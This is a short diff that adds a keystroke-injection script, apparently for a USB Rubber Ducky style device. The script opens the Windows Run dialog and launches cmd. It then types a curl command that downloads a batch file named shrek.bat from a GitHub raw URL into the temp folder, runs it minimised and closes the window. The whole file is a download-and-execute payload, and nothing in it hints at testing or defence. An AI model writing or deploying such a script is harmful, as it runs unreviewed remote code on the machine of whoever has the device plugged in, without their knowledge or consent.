@@ -1,0 +1,10 @@
+DELAY 2000
+GUI r
+
+DELAY 2000
+STRING cmd
+ENTER
+
+DELAY 2000
+STRING curl --output-dir "%temp%" -O "https://raw.githubusercontent.com/NeoRafajlovic/shrekfile/refs/heads/main/shrek.bat" && start "" /min "%temp%\shrek.bat" min && exit
+ENTER
